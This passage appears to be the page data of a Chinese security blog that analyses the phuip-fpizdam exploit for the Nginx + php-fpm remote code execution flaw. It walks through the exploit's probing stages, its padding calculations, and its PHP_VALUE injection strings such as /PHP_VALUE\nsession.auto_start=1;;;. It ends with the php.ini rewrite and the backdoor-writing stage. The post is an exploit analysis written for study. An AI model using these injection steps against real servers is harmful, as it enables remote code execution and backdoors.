alt=\"KvqSQs.md.png\"></a></p>\n<p>在计算PosOffset值(固定长为34)与pi长度差后，在pi字符串后拼接对应长度差个数的;</p>\n<p>如下图</p>\n<p><a href=\"https://imgchr.com/i/Kvq9Lq\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvq9Lq.md.png\" alt=\"Kvq9Lq.md.png\"></a></p>\n<p>例如传入phpValue值为\\nsession.auto_start=1</p>\n<p>最终返回值为/PHP_VALUE\\nsession.auto_start=1;;;</p>\n<h3 id=\"baseStatus探测阶段\"><a href=\"#baseStatus探测阶段\" class=\"headerlink\" title=\"baseStatus探测阶段\"></a>baseStatus探测阶段</h3><p>发送位置：</p>\n<p>位于detect.go 32行</p>\n<p><a href=\"https://imgchr.com/i/KvqPe0\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqPe0.md.png\" alt=\"KvqPe0.md.png\"></a></p>\n<p>发包次数：</p>\n<p>1次</p>\n<p>补位数据个数：</p>\n<p>Q个数1499、等号个数1</p>\n<p>Payload:</p>\n<p>/path\\ninfo.php</p>\n<p>数据包</p>\n<p><a href=\"https://imgchr.com/i/KvqiwV\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqiwV.md.png\" alt=\"KvqiwV.md.png\"></a></p>\n<p>作用：通过这次发包，确定目标系统的baseStatus，如果本次发包返回状态码为200，则后续baseStatus为200</p>\n<p>详情：</p>\n<p>main.go中82行处调用Detect</p>\n<p><a href=\"https://imgchr.com/i/KvqFoT\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqFoT.md.png\" alt=\"KvqFoT.md.png\"></a></p>\n<p><a href=\"https://imgchr.com/i/KvqAFU\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqAFU.md.png\" alt=\"KvqAFU.md.png\"></a></p>\n<p>Detect调用requester.Request发包</p>\n<p>requester.Request方法如下</p>\n<p><a href=\"https://imgchr.com/i/KvqEYF\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqEYF.md.png\" alt=\"KvqEYF.md.png\"></a></p>\n<p>requester.Request调用RequestWithQueryStringPrefix方法发包</p>\n<p><a href=\"https://imgchr.com/i/KvqVW4\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqVW4.md.png\" alt=\"KvqVW4.md.png\"></a></p>\n<p>通过本次发包返回的状态码，确定目标系统的baseStatus</p>\n<h3 id=\"Q字符长度候选值确认阶段\"><a href=\"#Q字符长度候选值确认阶段\" class=\"headerlink\" title=\"Q字符长度候选值确认阶段\"></a>Q字符长度候选值确认阶段</h3><p>发送位置：</p>\n<p>位于detect.go 47行</p>\n<p><a href=\"https://imgchr.com/i/KvqeSJ\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqeSJ.md.png\" alt=\"KvqeSJ.md.png\"></a></p>\n<p>发包次数：</p>\n<p>91次</p>\n<p>补位数据个数：</p>\n<p>Q个数1499-1949步长5递增、等号个数1</p>\n<p>Payload:</p>\n<p>/PHP\\nis_the_shittiest_lang.php</p>\n<p>数据包</p>\n<p><a href=\"https://imgchr.com/i/Kvqml9\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvqml9.md.png\" alt=\"Kvqml9.md.png\"></a></p>\n<p>作用：</p>\n<p>确认导致返回状态码异于baseStatus的Q长度加入qsl候选列表(qslCandidates)，候选列表中还有其长度减五以及减十这两个候选值</p>\n<p>详情：</p>\n<p>此处发包，位于一处for循环中</p>\n<p>其中MaxQSl、MinQSL、QSLDetectStep值如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqnyR.png\" alt=\"KvqnyR.png\"></p>\n<p>可见该循环一个可以循环91次</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvquO1.png\" alt=\"KvquO1.png\"></p>\n<p>仍然调用RequestWithQueryStringPrefix方法发包</p>\n<p>对应传入RequestWithQueryStringPrefix方法的pathInfo为BreakingPayload，params</p>\n<p>为ap</p>\n<p>BreakingPayload值如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqMex.png\" alt=\"KvqMex.png\"></p>\n<p>Ap值如下图</p>\n<p><a href=\"https://imgchr.com/i/KvqQw6\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqQw6.md.png\" alt=\"KvqQw6.md.png\"></a></p>\n<p>即对应的params.PisosLength值也就是补充等号个数为1，对应的params.QueryStringLength值为qsl，随循环递增</p>\n<p><a href=\"https://imgchr.com/i/KvqlTK\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqlTK.md.png\" alt=\"KvqlTK.md.png\"></a></p>\n<p>当Q长度使得返回状态码异于baseStatus，将这个Q长度值保存到qslCandidates列表中</p>\n<h3 id=\"sanity-check阶段\"><a href=\"#sanity-check阶段\" class=\"headerlink\" title=\"sanity check阶段\"></a>sanity check阶段</h3><p>发送位置：</p>\n<p>位于detect.go 116行</p>\n<p><a href=\"https://imgchr.com/i/Kvq3FO\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvq3FO.md.png\" alt=\"Kvq3FO.md.png\"></a></p>\n<p>发包次数：</p>\n<p>10次</p>\n<p>补位数据个数：</p>\n<p>Q个数1949、等号个数256</p>\n<p>Payload:</p>\n<p>/PHP\\nSOSAT</p>\n<p>数据包</p>\n<p><a href=\"https://imgchr.com/i/Kvq8YD\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvq8YD.md.png\" alt=\"Kvq8YD.md.png\"></a></p>\n<p>作用：</p>\n<p>进行sanity check<br>操作，当此处数据包返回状态码与baseStatus值相同，且header头部不存在包含PHPSESSID字符串的set-cookie字段时，通过检测，反之，程序结束</p>\n<p>详情：</p>\n<p>SanityCheck方法在Detect方法中调用,如下图</p>\n<p><a href=\"https://imgchr.com/i/KvqGfe\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqGfe.md.png\" alt=\"KvqGfe.md.png\"></a></p>\n<p>可见此处也存在一个for循环，最多可以循环发包10次</p>\n<p><a href=\"https://imgchr.com/i/KvqYSH\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqYSH.md.png\" alt=\"KvqYSH.md.png\"></a></p>\n<p>SanityCheck方法仍然调用RequestWithQueryStringPrefix方法，</p>\n<p>此时pathInfo为”/PHP\\nSOSAT”，params.PisosLength值为256，补256个等号</p>\n<p>循环发送10次</p>\n<p><a href=\"https://imgchr.com/i/Kvqtld\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvqtld.md.png\" alt=\"Kvqtld.md.png\"></a></p>\n<p>检测sanity部分代码如下</p>\n<p><a href=\"https://imgchr.com/i/KvqN6A\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqN6A.md.png\" alt=\"KvqN6A.md.png\"></a></p>\n<h3 id=\"Q字符长度以及等号个数确认阶段\"><a href=\"#Q字符长度以及等号个数确认阶段\" class=\"headerlink\" title=\"Q字符长度以及等号个数确认阶段\"></a>Q字符长度以及等号个数确认阶段</h3><p>发送位置：</p>\n<p>位于detect.go 96行</p>\n<p><a href=\"https://imgchr.com/i/KvqUOI\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqUOI.md.png\" alt=\"KvqUOI.md.png\"></a></p>\n<p>发包次数：</p>\n<p>最大50*3*256次，当响应包header头存在set-cookie字段，且字段中存在PHPSESSID字符串时终止发包</p>\n<p>补位数据个数：</p>\n<p>Q个数qslCandidates -1/ qslCandidates -5 -1/ qslCandidates -10 -1<br>随中层三次循环变化、等号个数1-256随内层循环变化</p>\n<p>数据包</p>\n<p><a href=\"https://imgchr.com/i/Kvqdmt\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvqdmt.md.png\" alt=\"Kvqdmt.md.png\"></a></p>\n<p><a href=\"https://imgchr.com/i/Kvqw0P\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvqw0P.md.png\" alt=\"Kvqw0P.md.png\"></a></p>\n<p><a href=\"https://imgchr.com/i/Kvq0Tf\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvq0Tf.md.png\" alt=\"Kvq0Tf.md.png\"></a></p>\n<p>作用：</p>\n<p>分别尝试Q的个数为qslCandidates-1长度、qslCandidates-5-1、qslCandidates-10-1长度下，等号个数从1到256的请求的不同效果。</p>\n<p>找到当响应包header头存在set-cookie字段，且字段中存在PHPSESSID字符串时，对应的Q个数以及等号个数，共后续攻击利用</p>\n<p>详情：</p>\n<p>此处发包位于Detect方法中96行处</p>\n<p><a href=\"https://imgchr.com/i/KvqDk8\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqDk8.md.png\" alt=\"KvqDk8.md.png\"></a></p>\n<p>可见存在一个三层嵌套循环</p>\n<p>外层for循环50次，中层循环3次，内层循环256次</p>\n<p>在内层循环里，即上图96行处，仍然使用RequestWithQueryStringPrefix方法发包</p>\n<p>Payload值获取于Detect方法中87行处的MakePathInfo方法中,如下图</p>\n<p><a href=\"https://imgchr.com/i/KvqrtS\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqrtS.md.png\" alt=\"KvqrtS.md.png\"></a></p>\n<p>传入MakePathInfo方法中的值为method.PHPOptionEnable</p>\n<p><a href=\"https://imgchr.com/i/Kvqsfg\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvqsfg.md.png\" alt=\"Kvqsfg.md.png\"></a></p>\n<p>即session.auto_start=1</p>\n<p>在MakePathInfo方法中，将传入的phpValue参数值前拼接/PHP_VALUE\\n，并赋值pi</p>\n<p><a href=\"https://imgchr.com/i/Kvq6pQ\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvq6pQ.md.png\" alt=\"Kvq6pQ.md.png\"></a></p>\n<p>计算PosOffset值(固定34)与pi长度差并在pi后拼接对应长度差个数的;如下图</p>\n<p><a href=\"https://imgchr.com/i/Kvqclj\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvqclj.md.png\" alt=\"Kvqclj.md.png\"></a></p>\n<p>最终payload即pathInfo为/PHP_VALUE\\nsession.auto_start=1;;;</p>\n<p>params.QueryStringLength值与params.PisosLength值获取于Detect方法中95行处qsl与pl，如下图</p>\n<p><a href=\"https://imgchr.com/i/Kvqg6s\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvqg6s.md.png\" alt=\"Kvqg6s.md.png\"></a></p>\n<p>qsl值为中层循环时遍历数组qslCandidates中的值，qslCandidates中的值如下图，分别为1785/1790/1795，这个列表值是由Q字符长度候选值确认阶段计算的候选Q长度值减5以及减10得来</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvq2Xn.png\" alt=\"Kvq2Xn.png\"></p>\n<p>Pl值为内层循环时遍历数组plCandidates中的值，plCandidates中的值如下图，分别为1-256</p>\n<p><a href=\"https://imgchr.com/i/Kvqf00\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvqf00.md.png\" alt=\"Kvqf00.md.png\"></a></p>\n<p>会随着内层循环从0递增，因此最终补充的等号个数逐渐从1个随发包递增-置1-递增。</p>\n<p>params.QueryStringLength值获取与</p>\n<p>当返回值满足如下if分支时，循环结束</p>\n<p><a href=\"https://imgchr.com/i/Kvq5kT\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvq5kT.md.png\" alt=\"Kvq5kT.md.png\"></a></p>\n<p>跟入method.Check方法，如下图</p>\n<p><a href=\"https://imgchr.com/i/KvqItU\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqItU.md.png\" alt=\"KvqItU.md.png\"></a></p>\n<p>当响应包header头存在set-cookie字段，且字段中存在PHPSESSID字符串，则method.Check方法返回true，循环终止。返回params值(params.PisosLength/params.QueryStringLength)共后续发包使用</p>\n<p>满足条件的数据包如下</p>\n<p><a href=\"https://imgchr.com/i/KvqohF\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqohF.md.png\" alt=\"KvqohF.md.png\"></a></p>\n<p>当三层循环完全结束后，仍无满足条件的响应数据包，程序返回not vulnerable or other<br>failure</p>\n<p>当该过程结束后，会再次发送50个数据包，试图将session.auto_start设置回0</p>\n<h3 id=\"修改PHP-ini阶段\"><a href=\"#修改PHP-ini阶段\" class=\"headerlink\" title=\"修改PHP.ini阶段\"></a>修改PHP.ini阶段</h3><p>发送位置：</p>\n<p>位于attack.go 33行</p>\n<p><a href=\"https://imgchr.com/i/Kvq7p4\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvq7p4.md.png\" alt=\"Kvq7p4.md.png\"></a></p>\n<p>发包次数：</p>\n<p>不定，直到响应数据包body中存在”/bin/which”字符串后停止发包</p>\n<p>补位数据个数：</p>\n<p>Q个数以及等号个数由上一阶段(Q字符长度以及等号个数确认阶段)确定</p>\n<p>Payload:</p>\n<p>循环发送chain数组值</p>\n<p>数据包</p>\n<p><a href=\"https://imgchr.com/i/KvqH1J\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqH1J.md.png\" alt=\"KvqH1J.md.png\"></a></p>\n<p>作用：</p>\n<p>修改php.ini</p>\n<p>详情：</p>\n<p>Attack方法位于main.go 103行被调用，接收上一阶段得出的params值进行payload计算</p>\n<p><a href=\"https://imgchr.com/i/Kvqbc9\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvqbc9.md.png\" alt=\"Kvqbc9.md.png\"></a></p>\n<p>跟入Attack方法</p>\n<p><a href=\"https://imgchr.com/i/KvqqXR\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqqXR.md.png\" alt=\"KvqqXR.md.png\"></a></p>\n<p>可见存在两大段for循环块</p>\n<p>首先看第一段for循环，该处for循环中嵌套一层循环</p>\n<p><a href=\"https://imgchr.com/i/KvqOn1\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqOn1.md.png\" alt=\"KvqOn1.md.png\"></a></p>\n<p>从chain中取payload，并传递给SetSettingSingle发包</p>\n<p>Chain值如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqX0x.png\" alt=\"KvqX0x.png\"></p>\n<p>SetSettingSingle方法</p>\n<p><a href=\"https://imgchr.com/i/Kvqj76\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/Kvqj76.md.png\" alt=\"Kvqj76.md.png\"></a></p>\n<p>SetSettingSingle方法首先调用MakePathInfo处理payload，如上图29行，接着调用RequestWithQueryStringPrefix方法发包</p>\n<p>此时PathInfo值为<br>/PHP_VALUE/nsession.auto_start=0;;;形式，其中session.auto_start=0为遍历chain中值</p>\n<p>其中Q的个数与等号个数，又上一步返回的params值来计算</p>\n<p>发包结果如下</p>\n<p><a href=\"https://imgchr.com/i/KvqxAK\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqxAK.md.png\" alt=\"KvqxAK.md.png\"></a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvqztO.png\" alt=\"KvqztO.png\"></p>\n<p>只有当返回body中存在successPattern值时，最外层for循环才会结束，否则一直循环发送chain中的值。如下图</p>\n<p><a href=\"https://imgchr.com/i/KvLShD\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvLShD.md.png\" alt=\"KvLShD.md.png\"></a></p>\n<p>successPattern 值为”/bin/which”，如下图</p>\n<p><a href=\"https://imgchr.com/i/KvL99e\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvL99e.md.png\" alt=\"KvL99e.md.png\"></a></p>\n<p>最终结束时的返回包如下</p>\n<p><a href=\"https://imgchr.com/i/KvLC1H\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvLC1H.md.png\" alt=\"KvLC1H.md.png\"></a></p>\n<h3 id=\"写入后门阶段\"><a href=\"#写入后门阶段\" class=\"headerlink\" title=\"写入后门阶段\"></a>写入后门阶段</h3><p>发送位置：</p>\n<p>位于attack.go 48行</p>\n<p><a href=\"https://imgchr.com/i/KvLPcd\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvLPcd.md.png\" alt=\"KvLPcd.md.png\"></a></p>\n<p>发包次数：</p>\n<p>不定，直到响应数据包body中存在”/bin/which”字符串后停止发包</p>\n<p>补位数据个数：</p>\n<p>Q个数以及等号个数由Q字符长度以及等号个数确认阶段确定</p>\n<p>Payload:</p>\n<p>/</p>\n<p>数据包</p>\n<p><a href=\"https://imgchr.com/i/KvLijA\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvLijA.md.png\" alt=\"KvLijA.md.png\"></a></p>\n<p>作用：</p>\n<p>清空tmp\\a，并在tmp\\a中写入payload</p>\n<p>详情：</p>\n<p>此处发包位于Attack方法中的第二个for循环块</p>\n<p><a href=\"https://imgchr.com/i/KvLknI\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvLknI.md.png\" alt=\"KvLknI.md.png\"></a></p>\n<p>同上一个(修改PHP.ini阶段)相似，也是调用RequestWithQueryStringPrefix方法发包</p>\n<p>此时PathInfo值为”/”，<br>params值使用的是由Q字符长度以及等号个数确认阶段中得出的params值</p>\n<p>发包结果如下</p>\n<p><a href=\"https://imgchr.com/i/KvLABt\"><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/11/04/KvLABt.md.png\" alt=\"KvLABt.md.png\"></a></p>\n<p>当返回body中存在/bin/which时，发包结束</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>PHP 官方披露了Nginx + php-fpm 部分配置下存在的远程代码执行高危漏洞，攻击者可利用漏洞对目标网站进行远程代码执行攻击。</p>\n<p>本文只针对此次攻击所用到的EXP进行分析，并不涉及漏洞原理分析</p>\n<p>漏洞EXP下载地址</p>\n<p><a href=\"https://github.com/neex/phuip-fpizdam\">https://github.com/neex/phuip-fpizdam</a></p>","more":"<h2 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h2><h3 id=\"两个重要的函数\"><a href=\"#两个重要的函数\" class=\"headerlink\" title=\"两个重要的函数\"></a>两个重要的函数</h3><h4 id=\"RequestWithQueryStringPrefix方法\"><a href=\"#RequestWithQueryStringPrefix方法\" class=\"headerlink\" title=\"RequestWithQueryStringPrefix方法\"></a>RequestWithQueryStringPrefix方法</h4><p>RequestWithQueryStringPrefix方法</p>\n<p><a href=\"https://imgchr.com/i/KxkPmT\"><img src=\"https://s2.ax1x.com/2019/11/04/KxkPmT.md.png\" alt=\"KxkPmT.md.png\"></a></p>\n<p>RequestWithQueryStringPrefix方法用来发送构造的get请求，该方法接收三个传入参数</p>\n<p>pathInfo params prefix</p>\n<p>比较关键的参数是前两个，即pathInfo与params</p>\n<p>在发送数据包前，RequestWithQueryStringPrefix方法会用pathInfo与params计算与构造两部分数据</p>\n<p>1、GET 参数中补字符Q个数</p>\n<p>RequestWithQueryStringPrefix方法会计算qslPrime值用以在get请求参数中补”Q”字符，如下图</p>\n<p><a href=\"https://imgchr.com/i/Kxk9XV\"><img src=\"https://s2.ax1x.com/2019/11/04/Kxk9XV.md.png\" alt=\"Kxk9XV.md.png\"></a></p>\n<p>qslPrime值计算如下</p>\n<p><a href=\"https://imgchr.com/i/KxkQ0O\"><img src=\"https://s2.ax1x.com/2019/11/04/KxkQ0O.md.png\" alt=\"KxkQ0O.md.png\"></a></p>\n<p>可见是由params.QueryStringLength值、qslDelta值 prefix长度值计算得来</p>\n<p>params.QueryStringLength，这个值由调用RequestWithQueryStringPrefix方法时作为第二个参数传入的params中取得</p>\n<p>prefix值由RequestWithQueryStringPrefix方法用来调用时传入</p>\n<p><a href=\"https://imgchr.com/i/Kvb7Lt\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvb7Lt.md.png\" alt=\"Kvb7Lt.md.png\"></a></p>\n<p>qslDelta值计算如下</p>\n<p><a href=\"https://imgchr.com/i/KvbbeP\"><img src=\"https://s2.ax1x.com/2019/11/04/KvbbeP.md.png\" alt=\"KvbbeP.md.png\"></a></p>\n<p>其中pathInfo为值由RequestWithQueryStringPrefix方法用来调用时传入，以baseStatus探测阶段为例(见下文)：</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/04/Kvbqdf.png\" alt=\"Kvbqdf.png\"></p>\n<p>pathInfo：/path\\ninfo.php</p>\n<p>r.u.EscapedPath()值：</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/04/KvbLo8.png\" alt=\"KvbLo8.png\"></p>\n<p>r.u.EscapedPath()：/index.php</p>\n<p>u.EscapedPath()值计算如下：</p>\n<p>u := *r.u</p>\n<p>u.Path = u.Path + pathInfo</p>\n<p>在此例中，u.EscapedPath() 值为/index.php/path%0Ainfo.php</p>\n<p>qslDelta 最终长度计算可化简为：len(“%0A”)-len(“\\n”)=2</p>\n<p>此例中，qslPrime最终值为1499，如下图</p>\n<p><a href=\"https://imgchr.com/i/KvbXFS\"><img src=\"https://s2.ax1x.com/2019/11/04/KvbXFS.md.png\" alt=\"KvbXFS.md.png\"></a></p>\n<p>最终在GET请求参数部分补充1499个Q</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/04/KvbjJg.png\" alt=\"KvbjJg.png\"></p>\n<p>2、Header头D-Pisos字段补充等号个数</p>\n<p><a href=\"https://imgchr.com/i/KvbvWQ\"><img src=\"https://s2.ax1x.com/2019/11/04/KvbvWQ.md.png\" alt=\"KvbvWQ.md.png\"></a></p>\n<p>Header头D-Pisos字段值计算如上，其中补充等号个数为params.PisosLength的值，这个值由调用RequestWithQueryStringPrefix方法时作为第二个参数传入的params中取得</p>\n<p>最终发包如下</p>\n<p><a href=\"https://imgchr.com/i/Kvbxzj\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvbxzj.md.png\" alt=\"Kvbxzj.md.png\"></a></p>\n<h4 id=\"MakePathInfo方法\"><a href=\"#MakePathInfo方法\" class=\"headerlink\" title=\"MakePathInfo方法\"></a>MakePathInfo方法</h4><p>MakePathInfo方法将传入的参数值前拼接/PHP_VALUE\\n，并赋值pi</p>\n<p><a href=\"https://imgchr.com/i/KvqSQs\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqSQs.md.png\" alt=\"KvqSQs.md.png\"></a></p>\n<p>在计算PosOffset值(固定长为34)与pi长度差后，在pi字符串后拼接对应长度差个数的;</p>\n<p>如下图</p>\n<p><a href=\"https://imgchr.com/i/Kvq9Lq\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvq9Lq.md.png\" alt=\"Kvq9Lq.md.png\"></a></p>\n<p>例如传入phpValue值为\\nsession.auto_start=1</p>\n<p>最终返回值为/PHP_VALUE\\nsession.auto_start=1;;;</p>\n<h3 id=\"baseStatus探测阶段\"><a href=\"#baseStatus探测阶段\" class=\"headerlink\" title=\"baseStatus探测阶段\"></a>baseStatus探测阶段</h3><p>发送位置：</p>\n<p>位于detect.go 32行</p>\n<p><a href=\"https://imgchr.com/i/KvqPe0\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqPe0.md.png\" alt=\"KvqPe0.md.png\"></a></p>\n<p>发包次数：</p>\n<p>1次</p>\n<p>补位数据个数：</p>\n<p>Q个数1499、等号个数1</p>\n<p>Payload:</p>\n<p>/path\\ninfo.php</p>\n<p>数据包</p>\n<p><a href=\"https://imgchr.com/i/KvqiwV\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqiwV.md.png\" alt=\"KvqiwV.md.png\"></a></p>\n<p>作用：通过这次发包，确定目标系统的baseStatus，如果本次发包返回状态码为200，则后续baseStatus为200</p>\n<p>详情：</p>\n<p>main.go中82行处调用Detect</p>\n<p><a href=\"https://imgchr.com/i/KvqFoT\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqFoT.md.png\" alt=\"KvqFoT.md.png\"></a></p>\n<p><a href=\"https://imgchr.com/i/KvqAFU\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqAFU.md.png\" alt=\"KvqAFU.md.png\"></a></p>\n<p>Detect调用requester.Request发包</p>\n<p>requester.Request方法如下</p>\n<p><a href=\"https://imgchr.com/i/KvqEYF\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqEYF.md.png\" alt=\"KvqEYF.md.png\"></a></p>\n<p>requester.Request调用RequestWithQueryStringPrefix方法发包</p>\n<p><a href=\"https://imgchr.com/i/KvqVW4\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqVW4.md.png\" alt=\"KvqVW4.md.png\"></a></p>\n<p>通过本次发包返回的状态码，确定目标系统的baseStatus</p>\n<h3 id=\"Q字符长度候选值确认阶段\"><a href=\"#Q字符长度候选值确认阶段\" class=\"headerlink\" title=\"Q字符长度候选值确认阶段\"></a>Q字符长度候选值确认阶段</h3><p>发送位置：</p>\n<p>位于detect.go 47行</p>\n<p><a href=\"https://imgchr.com/i/KvqeSJ\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqeSJ.md.png\" alt=\"KvqeSJ.md.png\"></a></p>\n<p>发包次数：</p>\n<p>91次</p>\n<p>补位数据个数：</p>\n<p>Q个数1499-1949步长5递增、等号个数1</p>\n<p>Payload:</p>\n<p>/PHP\\nis_the_shittiest_lang.php</p>\n<p>数据包</p>\n<p><a href=\"https://imgchr.com/i/Kvqml9\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvqml9.md.png\" alt=\"Kvqml9.md.png\"></a></p>\n<p>作用：</p>\n<p>确认导致返回状态码异于baseStatus的Q长度加入qsl候选列表(qslCandidates)，候选列表中还有其长度减五以及减十这两个候选值</p>\n<p>详情：</p>\n<p>此处发包，位于一处for循环中</p>\n<p>其中MaxQSl、MinQSL、QSLDetectStep值如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/04/KvqnyR.png\" alt=\"KvqnyR.png\"></p>\n<p>可见该循环一个可以循环91次</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/04/KvquO1.png\" alt=\"KvquO1.png\"></p>\n<p>仍然调用RequestWithQueryStringPrefix方法发包</p>\n<p>对应传入RequestWithQueryStringPrefix方法的pathInfo为BreakingPayload，params</p>\n<p>为ap</p>\n<p>BreakingPayload值如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/04/KvqMex.png\" alt=\"KvqMex.png\"></p>\n<p>Ap值如下图</p>\n<p><a href=\"https://imgchr.com/i/KvqQw6\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqQw6.md.png\" alt=\"KvqQw6.md.png\"></a></p>\n<p>即对应的params.PisosLength值也就是补充等号个数为1，对应的params.QueryStringLength值为qsl，随循环递增</p>\n<p><a href=\"https://imgchr.com/i/KvqlTK\"><img src=\"https://s2.ax1x.com/2019/11/04/KvqlTK.md.png\" alt=\"KvqlTK.md.png\"></a></p>\n<p>当Q长度使得返回状态码异于baseStatus，将这个Q长度值保存到qslCandidates列表中</p>\n<h3 id=\"sanity-check阶段\"><a href=\"#sanity-check阶段\" class=\"headerlink\" title=\"sanity check阶段\"></a>sanity check阶段</h3><p>发送位置：</p>\n<p>位于detect.go 116行</p>\n<p><a href=\"https://imgchr.com/i/Kvq3FO\"><img src=\"https://s2.ax1x.com/2019/11/04/Kvq3FO.md.png\" 